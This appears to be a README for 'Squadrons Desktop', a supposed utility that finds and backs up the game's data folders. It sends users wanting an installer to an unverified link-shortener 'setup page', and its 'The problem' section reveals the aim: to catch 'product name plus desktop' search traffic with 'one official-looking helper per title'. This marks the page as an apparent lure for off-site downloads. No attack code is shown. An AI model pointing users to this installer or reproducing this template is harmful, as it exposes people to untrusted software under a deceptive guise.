# Squadrons Desktop

*Find the Squadrons folder fast and keep a local spare.*

## About

This repository is **Squadrons Desktop**, a Windows utility. Find the Squadrons folder fast and keep a local spare.

Patches move Squadrons data paths without warning.

It runs on the local PC. No account, and nothing is uploaded.

## Editions

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## What it does

- Locates Squadrons user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## The problem

Search traffic for Squadrons is the product name plus desktop.

Keep one official-looking helper per title.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
